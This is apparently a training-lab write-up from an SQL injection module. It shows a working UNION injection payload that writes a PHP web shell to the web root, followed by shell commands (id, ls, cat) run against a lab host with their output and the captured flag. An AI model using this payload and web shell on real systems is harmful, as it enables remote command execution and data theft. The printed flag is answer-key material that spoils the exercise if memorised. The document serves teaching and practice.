# Section 15: Writing Files

Module: 17. SQL Injection Fundamentals

---

## Questions & Answers

### 1. Find the flag by using a webshell.

Context:
- Write the shell:
```
a' UNION SELECT "",'<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- 
```
- Get the flag:
```
http://154.57.164.73:31501/shell.php?0=id

1 CN SHA Shangai 37.130001068 14 PH MANILA Manila 4.5199999809 uid=33(www-data) gid=33(www-data) groups=33(www-data) 

http://154.57.164.73:31501/shell.php?0=ls%20../

1 CN SHA Shangai 37.130001068 14 PH MANILA Manila 4.5199999809 flag.txt html 

http://154.57.164.73:31501/shell.php?0=cat%20../flag.txt

1 CN SHA Shangai 37.130001068 14 PH MANILA Manila 4.5199999809 d2b5b27ae688b6a0f1d21b7d3a0798cd 
```

**Answer:** `d2b5b27ae688b6a0f1d21b7d3a0798cd`

---

[Back to Module Index](./README.md)
